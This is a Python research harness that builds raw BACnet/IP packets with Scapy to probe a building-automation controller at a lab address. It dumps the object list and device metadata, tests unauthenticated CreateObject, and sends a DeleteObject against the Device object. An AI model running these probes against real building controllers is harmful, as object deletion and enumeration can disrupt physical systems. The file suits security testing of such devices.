import socket
import struct
from scapy.packet import Packet, bind_layers
from scapy.fields import ByteField, ShortField, XByteField
from rich.console import Console
from rich.table import Table
from rich.panel import Panel

console = Console()

# ----------------------------------------------------------------------
# 1. Scapy Custom BACnet/IP Protocol Layer Definitions
# ----------------------------------------------------------------------

class BVLC(Packet):
    name = "BVLC"
    fields_desc = [
        XByteField("type", 0x81),
        XByteField("function", 0x0A),
        ShortField("length", None)
    ]

    def post_build(self, p, pay):
        if self.length is None:
            l = len(p) + len(pay)
            p = p[:2] + struct.pack("!H", l) + p[4:]
        return p + pay

class NPDU(Packet):
    name = "NPDU"
    fields_desc = [
        ByteField("version", 0x01),
        XByteField("control", 0x04)
    ]

bind_layers(BVLC, NPDU)

# ----------------------------------------------------------------------
# 2. Protocol Lookup Dictionaries
# ----------------------------------------------------------------------

OBJECT_TYPES = {
    0: "Analog Input", 1: "Analog Output", 2: "Analog Value",
    3: "Binary Input", 4: "Binary Output", 5: "Binary Value",
    8: "Device", 13: "Multi-state Input", 14: "Multi-state Output",
    19: "Multi-state Value"
}

ERROR_CLASSES = {
    0: "device", 1: "object", 2: "property", 3: "resources",
    4: "security", 5: "services", 6: "definition"
}

ERROR_CODES = {
    0: "other", 31: "unknown-object", 39: "unknown-property",
    43: "write-access-denied", 49: "no-space-for-object", 50: "dynamic-creation-not-supported"
}

REJECT_REASONS = {
    0: "other", 1: "buffer-overflow", 2: "inconsistent-parameters",
    3: "invalid-parameter-data-type", 4: "invalid-tag",
    5: "missing-required-parameter", 6: "parameter-out-of-range",
    7: "too-many-arguments", 8: "undefined-enumeration",
    9: "unrecognized-service", 10: "invalid-data-encoding"
}

# Minimal set of BACnet standard Property Identifiers used by this harness.
# (Full list is proplist.h in bacnet-stack if you need more.)
PROPERTY_NAMES = {
    28: "Description", 70: "Model_Name", 76: "Object_List",
    77: "Object_Name", 79: "Object_Type", 121: "Status_Flags",
    149: "Vendor_Identifier",
}

# ----------------------------------------------------------------------
# 3. Payload Builders
# ----------------------------------------------------------------------

def build_read_property(obj_type, obj_instance, prop_id, invoke_id=1):
    """
    Constructs a ReadProperty (Service 0x0C) request.
    ReadProperty-Request ::= SEQUENCE {
        objectIdentifier   [0] BACnetObjectIdentifier,
        propertyIdentifier [1] BACnetPropertyIdentifier
    }
    Both fields are context-tagged, which is why tag0/tag1 below use the
    (tag_number<<4)|0x08|length pattern rather than application tags.
    """
    apdu_hdr = struct.pack("!BBB", 0x00, 0x05, invoke_id)
    service = struct.pack("!B", 0x0C)

    obj_composite = (obj_type << 22) | (obj_instance & 0x3FFFFF)
    tag0 = struct.pack("!BI", 0x0C, obj_composite)  # context tag 0, len 4

    if prop_id <= 255:
        tag1 = struct.pack("!BB", 0x19, prop_id)  # context tag 1, len 1
    else:
        tag1 = struct.pack("!BH", 0x1A, prop_id)  # context tag 1, len 2

    return bytes(BVLC(function=0x0A) / NPDU(control=0x04) / (apdu_hdr + service + tag0 + tag1))

def build_read_property_multiple(obj_type, obj_instance, prop_ids, invoke_id=1):
    """Constructs a ReadPropertyMultiple (Service 0x0E) request."""
    apdu_hdr = struct.pack("!BBB", 0x00, 0x05, invoke_id)
    service = struct.pack("!B", 0x0E)

    obj_composite = (obj_type << 22) | (obj_instance & 0x3FFFFF)
    tag0 = struct.pack("!BI", 0x0C, obj_composite)

    open_tag1 = b"\x1e"  # Opening Context Tag 1 (List of Properties)

    prop_list_bytes = b""
    for pid in prop_ids:
        if pid <= 255:
            prop_list_bytes += struct.pack("!BB", 0x09, pid)
        else:
            prop_list_bytes += struct.pack("!BH", 0x0A, pid)

    close_tag1 = b"\x1f"  # Closing Context Tag 1

    raw_apdu = apdu_hdr + service + tag0 + open_tag1 + prop_list_bytes + close_tag1
    return bytes(BVLC(function=0x0A) / NPDU(control=0x04) / raw_apdu)

def build_create_object(obj_type, obj_instance=None, invoke_id=5):
    """
    Constructs a CreateObject (Service 0x0A) request.

    CreateObject-Request ::= SEQUENCE {
        object-specifier [0] CHOICE {
            object-type       [0] BACnetObjectType,
            object-identifier [1] BACnetObjectIdentifier
        },
        list-of-initial-values [1] SEQUENCE OF BACnetPropertyValue OPTIONAL
    }

    Verified against bacnet-stack's create_object.c
    (create_object_decode_service_request): when specifying by
    object-identifier, the inner value MUST be context tag 1 (0x1C for a
    4-byte object id), not tag 0 -- tag 0 inside this CHOICE means
    "object-type only". Sending it as tag 0 makes the decoder treat your
    whole 4-byte object id as an out-of-range enumerated object-type,
    which is why the server replied Reject(reason=6, parameter-out-of-range).
    """
    apdu_hdr = struct.pack("!BBB", 0x00, 0x05, invoke_id)
    service = struct.pack("!B", 0x0A)

    if obj_instance is not None:
        obj_composite = (obj_type << 22) | (obj_instance & 0x3FFFFF)
        # Opening Tag 0 (0x0E), object-identifier as CONTEXT TAG 1 (0x1C), Closing Tag 0 (0x0F)
        tag0 = b"\x0e" + struct.pack("!BI", 0x1C, obj_composite) + b"\x0f"
    else:
        # Opening Tag 0 (0x0E), object-type as CONTEXT TAG 0 (0x09), Closing Tag 0 (0x0F)
        tag0 = b"\x0e" + struct.pack("!BB", 0x09, obj_type) + b"\x0f"

    raw_apdu = apdu_hdr + service + tag0
    return bytes(BVLC(function=0x0A) / NPDU(control=0x04) / raw_apdu)

def build_delete_object(obj_type, obj_instance, invoke_id=6):
    """
    Constructs a DeleteObject (Service 0x0B) request.

    DeleteObject-Request ::= SEQUENCE { object-identifier BACnetObjectIdentifier }

    Unlike CreateObject, this field is NOT context-tagged -- delete_object.c
    decodes it with bacnet_object_id_application_decode(), i.e. a plain
    APPLICATION tag (0xC4 = tag 12/object-id, class=application, len 4).
    """
    apdu_hdr = struct.pack("!BBB", 0x00, 0x05, invoke_id)
    service = struct.pack("!B", 0x0B)

    obj_composite = (obj_type << 22) | (obj_instance & 0x3FFFFF)
    obj_id = struct.pack("!BI", 0xC4, obj_composite)  # application tag 12, len 4

    raw_apdu = apdu_hdr + service + obj_id
    return bytes(BVLC(function=0x0A) / NPDU(control=0x04) / raw_apdu)

# ----------------------------------------------------------------------
# 4. Tag-aware Response Parser
# ----------------------------------------------------------------------

def read_tag_header(data, i):
    """
    Decodes a single BACnet tag header at offset i.
    Returns (tag_number, is_context, length, header_len, is_opening, is_closing).

    Bit layout per bacdcode.c encode_tag():
        bits 7-4 = tag number (0xF = extended tag number follows)
        bit  3   = class (0 = application, 1 = context-specific)
        bits 2-0 = length (0-4), 5 = extended length follows, 6 = opening, 7 = closing
    """
    b = data[i]
    tag_number = (b >> 4) & 0x0F
    is_context = bool(b & 0x08)
    lvt = b & 0x07
    header_len = 1

    if tag_number == 0x0F:
        tag_number = data[i + 1]
        header_len += 1

    if lvt == 6:
        return tag_number, is_context, 0, header_len, True, False
    if lvt == 7:
        return tag_number, is_context, 0, header_len, False, True
    if lvt == 5:
        length_pos = i + header_len
        length = data[length_pos]
        header_len += 1
        if length == 254:
            length = struct.unpack("!H", data[length_pos + 1:length_pos + 3])[0]
            header_len += 2
        elif length == 255:
            length = struct.unpack("!I", data[length_pos + 1:length_pos + 5])[0]
            header_len += 4
        return tag_number, is_context, length, header_len, False, False

    return tag_number, is_context, lvt, header_len, False, False

def decode_app_primitive(tag_number, raw):
    """Decodes an APPLICATION-class primitive's value bytes by tag number."""
    if tag_number == 1:  # Boolean (encoded in lvt, not usually hit via this path)
        return bool(raw[0]) if raw else None
    if tag_number == 2:  # Unsigned Integer
        return int.from_bytes(raw, "big") if raw else 0
    if tag_number == 3:  # Signed Integer
        return int.from_bytes(raw, "big", signed=True) if raw else 0
    if tag_number == 7:  # Character String (first byte = encoding, 0x00 = UTF-8/ANSI)
        if len(raw) > 1:
            return raw[1:].decode("utf-8", errors="replace")
        return ""
    if tag_number == 9:  # Enumerated
        return int.from_bytes(raw, "big") if raw else 0
    if tag_number == 12:  # Object Identifier
        if len(raw) == 4:
            v = struct.unpack("!I", raw)[0]
            return f"({(v >> 22) & 0x3FF}, {v & 0x3FFFFF})"
    return raw.hex()

def decode_rpm_ack(payload):
    """
    Walks a ReadPropertyMultiple-ACK payload per rpm.c's encoder:
        tag0            objectIdentifier
        tag1 (open)     listOfResults
          tag2              propertyIdentifier
          tag3  (optional)  propertyArrayIndex
          tag4 (open/close) propertyValue -> application-tagged primitive(s) inside
          tag5 (open/close) propertyAccessError -> two application enumerateds inside
        tag1 (close)
    Returns (obj_type, obj_instance, [(property_name, value), ...])
    """
    i = 0
    obj_type = obj_instance = None
    results = []

    tag_number, is_context, length, hlen, opening, closing = read_tag_header(payload, i)
    if is_context and tag_number == 0 and not opening:
        raw = payload[i + hlen:i + hlen + length]
        composite = int.from_bytes(raw, "big")
        obj_type = (composite >> 22) & 0x3FF
        obj_instance = composite & 0x3FFFFF
        i += hlen + length

    tag_number, is_context, length, hlen, opening, closing = read_tag_header(payload, i)
    if is_context and tag_number == 1 and opening:
        i += hlen

    while i < len(payload):
        tag_number, is_context, length, hlen, opening, closing = read_tag_header(payload, i)
        if is_context and tag_number == 1 and closing:
            break
        if not (is_context and tag_number == 2 and not opening and not closing):
            i += 1  # resync on unexpected byte rather than looping forever
            continue

        prop_raw = payload[i + hlen:i + hlen + length]
        prop_id = int.from_bytes(prop_raw, "big")
        prop_name = PROPERTY_NAMES.get(prop_id, f"Property_{prop_id}")
        i += hlen + length

        tag_number, is_context, length, hlen, opening, closing = read_tag_header(payload, i)
        if is_context and tag_number == 3 and not opening and not closing:
            i += hlen + length
            tag_number, is_context, length, hlen, opening, closing = read_tag_header(payload, i)

        if is_context and tag_number == 4 and opening:
            i += hlen
            values = []
            while True:
                tnum, tctx, tlen, thlen, topen, tclose = read_tag_header(payload, i)
                if tctx and tnum == 4 and tclose:
                    i += thlen
                    break
                values.append(decode_app_primitive(tnum, payload[i + thlen:i + thlen + tlen]))
                i += thlen + tlen
            results.append((prop_name, values[0] if len(values) == 1 else values))

        elif is_context and tag_number == 5 and opening:
            i += hlen
            tnum, tctx, tlen, thlen, topen, tclose = read_tag_header(payload, i)
            err_class = int.from_bytes(payload[i + thlen:i + thlen + tlen], "big")
            i += thlen + tlen
            tnum, tctx, tlen, thlen, topen, tclose = read_tag_header(payload, i)
            err_code = int.from_bytes(payload[i + thlen:i + thlen + tlen], "big")
            i += thlen + tlen
            _, _, _, thlen, _, _ = read_tag_header(payload, i)  # closing tag5
            i += thlen
            results.append((prop_name, f"ERROR {ERROR_CLASSES.get(err_class, err_class)}/"
                                        f"{ERROR_CODES.get(err_code, err_code)}"))
        else:
            break

    return obj_type, obj_instance, results

def parse_response(data):
    if not data or len(data) < 6:
        return {"type": "Malformed", "raw": data.hex(), "details": "Packet too short"}

    npdu_len = 2
    apdu_offset = 4 + npdu_len

    if len(data) <= apdu_offset:
        return {"type": "Malformed", "raw": data.hex(), "details": "Missing APDU payload"}

    apdu_byte = data[apdu_offset]
    apdu_type = (apdu_byte >> 4) & 0x0F

    parsed = {
        "type_id": apdu_type,
        "raw": data.hex(),
        "details": {}
    }

    if apdu_type == 3:  # ComplexACK
        parsed["type"] = "ComplexACK"
        if len(data) > apdu_offset + 2:
            parsed["invoke_id"] = data[apdu_offset + 1]
            parsed["service_choice"] = data[apdu_offset + 2]
            parsed["payload_bytes"] = data[apdu_offset + 3:]

    elif apdu_type == 2:  # SimpleACK
        parsed["type"] = "SimpleACK"
        if len(data) > apdu_offset + 2:
            parsed["invoke_id"] = data[apdu_offset + 1]
            parsed["service_choice"] = data[apdu_offset + 2]

    elif apdu_type == 5:  # Error-PDU
        parsed["type"] = "Error-PDU"
        if len(data) > apdu_offset + 3:
            parsed["invoke_id"] = data[apdu_offset + 1]
            parsed["service_choice"] = data[apdu_offset + 2]
            err_class_idx = data[apdu_offset + 4] if len(data) > apdu_offset + 4 else 0
            err_code_idx = data[apdu_offset + 6] if len(data) > apdu_offset + 6 else 0
            parsed["details"]["error_class"] = ERROR_CLASSES.get(err_class_idx, f"Unknown ({err_class_idx})")
            parsed["details"]["error_code"] = ERROR_CODES.get(err_code_idx, f"Unknown ({err_code_idx})")

    elif apdu_type == 6:  # Reject-PDU
        parsed["type"] = "Reject-PDU"
        if len(data) > apdu_offset + 2:
            parsed["invoke_id"] = data[apdu_offset + 1]
            reason_idx = data[apdu_offset + 2]
            parsed["details"]["reject_reason"] = reason_idx
            parsed["details"]["reject_reason_name"] = REJECT_REASONS.get(reason_idx, f"Unknown ({reason_idx})")

    elif apdu_type == 7:  # Abort-PDU
        parsed["type"] = "Abort-PDU"
        if len(data) > apdu_offset + 2:
            parsed["invoke_id"] = data[apdu_offset + 1]
            parsed["details"]["abort_reason"] = data[apdu_offset + 2]

    else:
        parsed["type"] = f"Unknown-APDU ({apdu_type})"

    return parsed

def parse_object_list(raw_payload):
    objects = []
    start_idx = raw_payload.find(b'\x3e')
    end_idx = raw_payload.rfind(b'\x3f')

    if start_idx == -1 or end_idx == -1:
        return objects

    container_data = raw_payload[start_idx + 1:end_idx]
    i = 0
    while i < len(container_data):
        tag = container_data[i]
        if tag == 0xC4 and (i + 4) < len(container_data):
            obj_raw = struct.unpack("!I", container_data[i+1:i+5])[0]
            obj_type = (obj_raw >> 22) & 0x3FF
            obj_instance = obj_raw & 0x3FFFFF
            type_str = OBJECT_TYPES.get(obj_type, f"Vendor/Unknown ({obj_type})")
            objects.append((obj_type, type_str, obj_instance, f"0x{obj_raw:08X}"))
            i += 5
        else:
            i += 1
    return objects

# ----------------------------------------------------------------------
# 5. Pillar 1 Execution Harness
# ----------------------------------------------------------------------

def run_pillar_one_tests():
    target_ip = "192.168.1.196"
    target_port = 47808

    console.print(Panel.fit(
        "[bold cyan]Pillar 1: The Object Model & Property Engine Research Harness[/bold cyan]\n"
        "[dim]Vectors: Property Leakage, Multi-Property Inspection & Dynamic Instantiation[/dim]",
        border_style="cyan"
    ))

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3.0)

    try:
        # --- Vector A: Property Enumeration & Leakage (Object_List) ---
        console.print("\n[bold yellow][Vector A] Dumping Object List (Property 76) on Device 1234...[/bold yellow]")
        req = build_read_property(obj_type=8, obj_instance=1234, prop_id=76, invoke_id=1)
        sock.sendto(req, (target_ip, target_port))
        data, _ = sock.recvfrom(4096)

        res = parse_response(data)
        if res["type"] == "ComplexACK":
            objs = parse_object_list(data)
            table = Table(title=f"Dumped Control Map (Total: {len(objs)} Objects)", header_style="bold magenta")
            table.add_column("Type ID", justify="right", style="cyan")
            table.add_column("Description", style="green")
            table.add_column("Instance", justify="right", style="yellow")
            table.add_column("Hex ID", style="dim white")

            for ot, desc, inst, hx in objs[:10]:
                table.add_row(str(ot), desc, str(inst), hx)
            console.print(table)
            if len(objs) > 10:
                console.print(f"[dim]... and {len(objs) - 10} additional objects truncated from display.[/dim]")
        else:
            console.print(f"[bold red][-] Failed to dump object list: {res['type']}[/bold red]")

        # --- Vector B: Multi-Property Extraction (ReadPropertyMultiple) ---
        console.print("\n[bold yellow][Vector B] Executing ReadPropertyMultiple (Object_Name [77], Model_Name [70], Vendor_ID [149])...[/bold yellow]")
        rpm_req = build_read_property_multiple(obj_type=8, obj_instance=1234, prop_ids=[77, 70, 149], invoke_id=2)
        sock.sendto(rpm_req, (target_ip, target_port))
        data, _ = sock.recvfrom(4096)

        res = parse_response(data)
        console.print(f"[+] Response Type: [bold green]{res['type']}[/bold green]")

        if res["type"] == "ComplexACK" and "payload_bytes" in res:
            obj_type, obj_instance, props = decode_rpm_ack(res["payload_bytes"])

            rpm_table = Table(title=f"Extracted Multi-Property Metadata (Device {obj_instance})", header_style="bold blue")
            rpm_table.add_column("Property", style="cyan")
            rpm_table.add_column("Value", style="green")

            for name, val in props:
                rpm_table.add_row(name, str(val))

            if not props:
                rpm_table.add_row("Raw Hex", res["payload_bytes"].hex())

            console.print(rpm_table)
        else:
            console.print(f"[bold red][-] Failed RPM query: {res['type']}[/bold red]")

        # --- Vector C: Dynamic Object Instantiation (CreateObject Test) ---
        console.print("\n[bold yellow][Vector C] Testing Dynamic Object Instantiation (Create Analog Value [2])...[/bold yellow]")
        create_req = build_create_object(obj_type=2, obj_instance=999, invoke_id=3)
        sock.sendto(create_req, (target_ip, target_port))
        data, _ = sock.recvfrom(4096)

        res = parse_response(data)
        console.print(f"[+] Response Type: [bold yellow]{res['type']}[/bold yellow]")
        if res["type"] == "Error-PDU":
            console.print(f"    [dim]Controlled Rejection Confirmed:[/dim] Class -> [cyan]{res['details'].get('error_class')}[/cyan], Code -> [cyan]{res['details'].get('error_code')}[/cyan]")
        elif res["type"] == "SimpleACK":
            console.print("    [bold red][!] Vulnerability Identified: Controller accepted unauthenticated runtime object creation![/bold red]")
        elif res["type"] == "Reject-PDU":
            console.print(f"    [dim]Server Rejected Request:[/dim] Reason -> [cyan]{res['details'].get('reject_reason_name')}[/cyan] ({res['details'].get('reject_reason')})")

        # --- Vector D: Extended Property ID Error Handling (Invalid Property 9999) ---
        console.print("\n[bold yellow][Vector D] Triggering Controlled Error-PDU (Querying Invalid Property 9999)...[/bold yellow]")
        err_req = build_read_property(obj_type=8, obj_instance=1234, prop_id=9999, invoke_id=4)
        sock.sendto(err_req, (target_ip, target_port))
        data, _ = sock.recvfrom(4096)

        res = parse_response(data)
        console.print(f"[+] Response Type: [bold green]{res['type']}[/bold green]")
        if res["type"] == "Error-PDU":
            console.print(f"    [green]Handled Safely without crashing![/green] Error Class: [cyan]{res['details'].get('error_class')}[/cyan] | Error Code: [cyan]{res['details'].get('error_code')}[/cyan]")
        else:
            console.print(f"    [dim]Raw Payload:[/dim] {res['raw']}")

        # --- Vector E: Dynamic Object Destruction (DeleteObject Test) ---
        console.print("\n[bold yellow][Vector E] Testing Dynamic Object Destruction (Delete Device 1234)...[/bold yellow]")
        delete_req = build_delete_object(obj_type=8, obj_instance=1234, invoke_id=6)
        sock.sendto(delete_req, (target_ip, target_port))
        data, _ = sock.recvfrom(4096)

        res = parse_response(data)
        console.print(f"[+] Response Type: [bold yellow]{res['type']}[/bold yellow]")
        if res["type"] == "Error-PDU":
            console.print(f"    [dim]Controlled Rejection Confirmed:[/dim] Class -> [cyan]{res['details'].get('error_class')}[/cyan], Code -> [cyan]{res['details'].get('error_code')}[/cyan]")
        elif res["type"] == "SimpleACK":
            console.print("    [bold red][!] Vulnerability Identified: Controller accepted unauthenticated object deletion![/bold red]")
        elif res["type"] == "Reject-PDU":
            console.print(f"    [dim]Server Rejected Request:[/dim] Reason -> [cyan]{res['details'].get('reject_reason_name')}[/cyan] ({res['details'].get('reject_reason')})")

    except Exception as e:
        console.print(f"[bold red][!] Execution Exception Caught: {e}[/bold red]")
    finally:
        sock.close()
        console.print("\n[dim][*] Socket closed. Pillar 1 research harness execution completed.[/dim]")

if __name__ == "__main__":
    run_pillar_one_tests()